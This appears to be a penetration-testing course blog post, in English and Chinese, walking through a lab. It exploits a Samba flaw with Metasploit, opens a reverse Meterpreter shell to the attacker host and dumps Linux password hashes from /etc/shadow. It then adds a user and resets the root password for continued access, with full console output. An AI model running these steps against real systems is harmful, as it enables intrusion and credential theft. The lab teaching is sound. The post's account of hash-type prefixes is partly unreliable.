---
layout: post
title: "Dumping Hashes With Hashdump"
date: "2023-03-17"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Dumping Hashes With Hashdump
We can dump Linux user hashes with the hashdump post exploitation module.

Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.

The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper.

# 使用 Hashdump 转储哈希
我们可以使用 hashdump post exploitation 模块转储 Linux 用户哈希。

Linux 密码哈希存储在 /etc/shadow 文件中，只能由 root 用户或具有 root 权限的用户访问。

hashdump 模块可用于从 /etc/shadow 文件中转储用户帐户哈希值，也可用于取消隐藏哈希值以使用 John the Ripper 破解密码。

# Demo: Dumping Hashes With Hashdump（演示：使用 Hashdump 转储哈希）
Hashdump is a post exploitation module that is utilized to dump the hashes of both Windows and Linux operating systems. And typically, when you're utilizing a Meterpreter session on a Windows target, the hashdump command is built right in. However, when we're utilizing a Meterpreter session on a Linux target, we'll need to load up the hashdump post exploitation module manually.

But in essence, the only thing you can do with a Linux hash is either crack it or you just store it for later use. 

```
ifconfig
eth1: 192.101.173.2
```

Target IP Address: 192.101.173.3

```
service postgresql start && msfconsole -q
workspace -a hashdump
setg RHOSTS 192.101.173.3
db_nmap -sV 192.101.173.3
search samba type:exploit
use exploit/linux/samba/is_known_pipename
show options
exploit
pwd
```

Put this in the background, and I will upgrade this session.

```
sessions
sessions -u 1
sessions 2
```

If I try and type in `hashdump`, similar to what we had done on Windows, that'll tell us unknown command hashdump.

```
meterpreter > hashdump
```

Given that that is the case, we need to load in the hashdump module, or we need to utilize the post exploitation module called hashdump.

The first thing we want to do is perform some enumeration.

```
meterpreter > sysinfo
```

Enumerate our current permissions or the user that we currently have access to.

```
meterpreter > getuid
```

You can see we have the user id of 0, which means we are root.

We can confirm this:  

```
meterpreter > shell
whoami
root
```

That means we can dump the Linux user account hashes.

Terminate this channel. And then I'll put our Meterpreter session in the background.

For some reason, that dies.

```
meterpreter > exit
```

We're just going to upgrade our previous command shell again.

```
sessions
sessions -u 1
sessions
```

[Linux Gather Dump Password Hashes for Linux Systems](https://www.rapid7.com/db/modules/post/linux/gather/hashdump/)

Post Module to dump the password hashes for all users on a Linux System

Linux 为 Linux 系统收集转储密码哈希

Post 模块转储 Linux 系统上所有用户的密码哈希

```
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 3
run
loot
```

We have shadow file. This is where you'll find the encrypted passwords.

Let's open up the password file first. 

```
cat /root/.msf4/loot/20211127211028_hashdump_192.101.173.3_linux.passwd_734157.txt
```

This will list out all of the user accounts on the system. We only have the root user and a few other service accounts.

List out the contents of the shadow file.

```
cat /root/.msf4/loot/20211127211028_hashdump_192.101.173.3_linux.shadow_465878.txt
```

It lists out the user accounts. However, in the place of the password, which is directly after the username is specified, you can see that there's an asterisk. Which means, in this case, the target system does not have a password specified for any of the user accounts. And that makes sense in some scenarios, especially in the case of the service accounts.

However, just to show you that this indeed does work.

```
sessions 3
```

Open up a shell session.

```
meterpreter > shell
/bin/bash -i
```

Change the password of the root user, or rather, I will provide the root user with the password.

```
root@victim-1:/tmp# passwd root
password123
password123
```

We've changed the password for the root user.

And then we can add a few users.

`-m`: Specify that we want to create a home directory.

And the name of the user will be alexis.

`-s`: Specify the shell I want the user to use.

```
root@victim-1:/tmp# useradd -m alexis -s /bin/bash
```

Specify the password for the user alexis.

```
root@victim-1:/tmp# passwd alexis
password321
password321
```

Terminate that channel. And again, we'll need to upgrade our Meterpreter session.

```
sessions -u 1
```

What we've done is we have created a new user, set the password, and change the password for the root user.

Let's take a look at what happens when we run hashdump now.

```
show options
set SESSION 4
run
```

It got the root user hash. And then after the hash, the user id as well as the group id specified, and then the home directory and the shell specified for that user.

```
loot
cat /root/.msf4/loot/20211127211028_hashdump_192.101.173.3_linux.hashes_851283.txt
```

In the case of the unshadowed file, what it does is it just prepares the user accounts and hashes for password cracking. It will get rid of the other information like the user id as well as the group id, and the home diretory as well as the shell session.

What you'll be left with is going to be the username and then the hash here.

When we talk about this little encapsulated value `$6$`, that's been encapsulated in the dollar signs, that is referring to the hashing algorithm or the encryption algorithm that was used to encrypt or hash these passwords. The higher the number, the stronger the hashing algorithm used. If you're working on an older Linux system, then you'll find that the value may be 1. And if it is 1, it means that that the password has been hashed with the MD5 hashing algorithm. If it's 2, it means it's been hashed with Blowfish. If it's 3 or 5, that means that it's been hashed or encrypted with the SHA-256 algorithm. And if it's 6, it's utilizing the strongest hashing algorithm, which is SHA-512.

Given that that is the case, if the passwords have been set or if the passwords are created following or in accordance with password security guidelines, then it may be very difficult to crack those passwords or those hashes for that matter. And if they are simple, then, there is a chance that you could crack them. But when it comes down to Linux and hashes, and the functionality of hashes in regards to post exploitation, there's very little that can be done. Unlike Windows, where we took a look at how to utilize the hashes for legitimate authentication or authenticated command execution. With Linux, we can't don that. But that's primarily because once you have root access on a Linux system, you can pretty much do whatever you want. You can create another user, specify a password, and enable SSH so that you can maintain access via SSH.

```
sessions 4
meterpreter > 
```

# 复现视频内容
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.153.226.2  netmask 255.255.255.0  broadcast 192.153.226.255
        ether 02:42:c0:99:e2:02  txqueuelen 0  (Ethernet)
```

Target IP Address: 192.153.226.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > workspace -a hashdump
[*] Added workspace: hashdump
[*] Workspace: hashdump
msf5 > setg RHOSTS 192.153.226.3
RHOSTS => 192.153.226.3
msf5 > db_nmap -sV 192.153.226.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-03-17 13:01 UTC
[*] Nmap: Nmap scan report for target-1 (192.153.226.3)
[*] Nmap: Host is up (0.000010s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT    STATE SERVICE     VERSION
[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: MAC Address: 02:42:C0:99:E2:03 (Unknown)
[*] Nmap: Service Info: Host: VICTIM-1
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.55 seconds
```

```
msf5 > search samba type:exploit

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   3   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
```

```
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.153.226.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf5 exploit(linux/samba/is_known_pipename) > exploit

[*] 192.153.226.3:445 - Using location \\192.153.226.3\exploitable\tmp for the path
[*] 192.153.226.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.153.226.3:445 - Share 'exploitable' has server-side path '/
[*] 192.153.226.3:445 - Uploaded payload to \\192.153.226.3\exploitable\tmp\DbWGJFwM.so
[*] 192.153.226.3:445 - Loading the payload from server-side path /tmp/DbWGJFwM.so using \\PIPE\/tmp/DbWGJFwM.so...
[-] 192.153.226.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.153.226.3:445 - Loading the payload from server-side path /tmp/DbWGJFwM.so using /tmp/DbWGJFwM.so...
[+] 192.153.226.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.153.226.2:35051 -> 192.153.226.3:445) at 2023-03-17 13:05:53 +0000

pwd
/tmp
```

```
^Z
Background session 1? [y/N]  y
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.153.226.2:35051 -> 192.153.226.3:445 (192.153.226.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.153.226.2:4433 
[*] Sending stage (985320 bytes) to 192.153.226.3
[*] Meterpreter session 2 opened (192.153.226.2:4433 -> 192.153.226.3:52802) at 2023-03-17 13:09:08 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```
meterpreter > hashdump
[-] Unknown command: hashdump.
meterpreter > sysinfo
Computer     : 192.153.226.3
OS           : Debian 8.11 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > shell
Process 45 created.
Channel 1 created.
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
^C
Terminate channel 1? [y/N]  y
meterpreter > 
[*] 192.153.226.3 - Meterpreter session 2 closed.  Reason: Died
```

```
msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.153.226.2:35051 -> 192.153.226.3:445 (192.153.226.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.153.226.2:4433 
[*] Sending stage (985320 bytes) to 192.153.226.3
[*] Meterpreter session 3 opened (192.153.226.2:4433 -> 192.153.226.3:42778) at 2023-03-17 13:14:17 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > 
[*] Stopping exploit/multi/handler

msf5 exploit(linux/samba/is_known_pipename) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.153.226.2:35051 -> 192.153.226.3:445 (192.153.226.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.153.226.3  192.153.226.2:4433 -> 192.153.226.3:42778 (192.153.226.3)
```

```
msf5 exploit(linux/samba/is_known_pipename) > search hashdump
Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   13  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
```

```
msf5 exploit(linux/samba/is_known_pipename) > use post/linux/gather/hashdumpmsf5 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set SESSION 3
SESSION => 3
msf5 post(linux/gather/hashdump) > run

[+] Unshadowed Password File: /root/.msf4/loot/20230317131814_hashdump_192.153.226.3_linux.hashes_755521.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > loot

Loot
====

host           service  type          name                   content     info                            path
----           -------  ----          ----                   -------     ----                            ----
192.153.226.3           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.shadow_750836.txt
192.153.226.3           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.passwd_260851.txt
192.153.226.3           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.hashes_755521.txt
```

linux.passwd: Linux Passwd File

```
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230317131814_hashdump_192.153.226.3_linux.passwd_260851.txt
[*] exec: cat /root/.msf4/loot/20230317131814_hashdump_192.153.226.3_linux.passwd_260851.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:107::/var/run/dbus:/bin/false
colord:x:105:112:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:106:113::/var/lib/saned:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
```

linux.shadow: Linux Password Shadow File

```
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230317131814_hashdump_192.153.226.3_linux.shadow_750836.txt
[*] exec: cat /root/.msf4/loot/20230317131814_hashdump_192.153.226.3_linux.shadow_750836.txt

root:*:17774:0:99999:7:::
daemon:*:17774:0:99999:7:::
bin:*:17774:0:99999:7:::
sys:*:17774:0:99999:7:::
sync:*:17774:0:99999:7:::
games:*:17774:0:99999:7:::
man:*:17774:0:99999:7:::
lp:*:17774:0:99999:7:::
mail:*:17774:0:99999:7:::
news:*:17774:0:99999:7:::
uucp:*:17774:0:99999:7:::
proxy:*:17774:0:99999:7:::
www-data:*:17774:0:99999:7:::
backup:*:17774:0:99999:7:::
list:*:17774:0:99999:7:::
irc:*:17774:0:99999:7:::
gnats:*:17774:0:99999:7:::
nobody:*:17774:0:99999:7:::
systemd-timesync:*:17774:0:99999:7:::
systemd-network:*:17774:0:99999:7:::
systemd-resolve:*:17774:0:99999:7:::
systemd-bus-proxy:*:17774:0:99999:7:::
messagebus:*:17812:0:99999:7:::
colord:*:17812:0:99999:7:::
saned:*:17812:0:99999:7:::
usbmux:*:17812:0:99999:7:::
```

```
msf5 post(linux/gather/hashdump) > sessions 3
[*] Starting interaction with 3...

meterpreter > shell
Process 77 created.
Channel 5 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/tmp# passwd root
passwd root
Enter new UNIX password: password123
Retype new UNIX password: password123
passwd: password updated successfully
root@victim-1:/tmp# useradd -m alexis -s /bin/bash
useradd -m alexis -s /bin/bash
root@victim-1:/tmp# passwd alexis
passwd alexis
Enter new UNIX password: password321
Retype new UNIX password: password321
passwd: password updated successfully
root@victim-1:/tmp# ^C
Terminate channel 5? [y/N]  y
meterpreter > 
[*] 192.153.226.3 - Meterpreter session 3 closed.  Reason: Died
```

```
msf5 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.153.226.2:35051 -> 192.153.226.3:445 (192.153.226.3)

msf5 post(linux/gather/hashdump) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.153.226.2:4433 
[*] Sending stage (985320 bytes) to 192.153.226.3
[*] Meterpreter session 4 opened (192.153.226.2:4433 -> 192.153.226.3:47506) at 2023-03-17 13:34:35 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 post(linux/gather/hashdump) > 
[*] Stopping exploit/multi/handler

msf5 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.153.226.2:35051 -> 192.153.226.3:445 (192.153.226.3)
  4         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.153.226.3  192.153.226.2:4433 -> 192.153.226.3:47506 (192.153.226.3)
```

```
msf5 post(linux/gather/hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  3                yes       The session to run this module on.

msf5 post(linux/gather/hashdump) > set SESSION 4
SESSION => 4
msf5 post(linux/gather/hashdump) > run

[+] root:$6$eY6fkgwD$IDNcKw91uICNzTu5LwVQZCosxN4iMqc/lRONUywb7ln/YA/6XmfYnYlAPQ84AutqxGoTR3fw038KO8xMpBy.U/:0:0:root:/root:/bin/bash
[+] alexis:$6$R3JXrhz9$QGleQFz9xi66c4Tnl2v2TC2qrbxF74RSJa7dek8M6LX5Sx4gyg7Swhp0CVIVpMQ5vbJ/MAB.b5lgZ1HiH2lbD.:1000:1000::/home/alexis:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20230317133657_hashdump_192.153.226.3_linux.hashes_438803.txt
[*] Post module execution completed
```

```
msf5 post(linux/gather/hashdump) > loot

Loot
====

host           service  type          name                   content     info                            path
----           -------  ----          ----                   -------     ----                            ----
192.153.226.3           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.shadow_750836.txt
192.153.226.3           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.passwd_260851.txt
192.153.226.3           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20230317131814_hashdump_192.153.22
6.3_linux.hashes_755521.txt
192.153.226.3           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20230317133657_hashdump_192.153.22
6.3_linux.shadow_096564.txt
192.153.226.3           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20230317133657_hashdump_192.153.22
6.3_linux.passwd_409093.txt
192.153.226.3           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20230317133657_hashdump_192.153.22
6.3_linux.hashes_438803.txt
```

linux.hashes: unshadowed_passwd.pwd

```
msf5 post(linux/gather/hashdump) > cat /root/.msf4/loot/20230317133657_hashdump_192.153.226.3_linux.hashes_438803.txt
[*] exec: cat /root/.msf4/loot/20230317133657_hashdump_192.153.226.3_linux.hashes_438803.txt

root:$6$eY6fkgwD$IDNcKw91uICNzTu5LwVQZCosxN4iMqc/lRONUywb7ln/YA/6XmfYnYlAPQ84AutqxGoTR3fw038KO8xMpBy.U/:0:0:root:/root:/bin/bash
alexis:$6$R3JXrhz9$QGleQFz9xi66c4Tnl2v2TC2qrbxF74RSJa7dek8M6LX5Sx4gyg7Swhp0CVIVpMQ5vbJ/MAB.b5lgZ1HiH2lbD.:1000:1000::/home/alexis:/bin/bash
```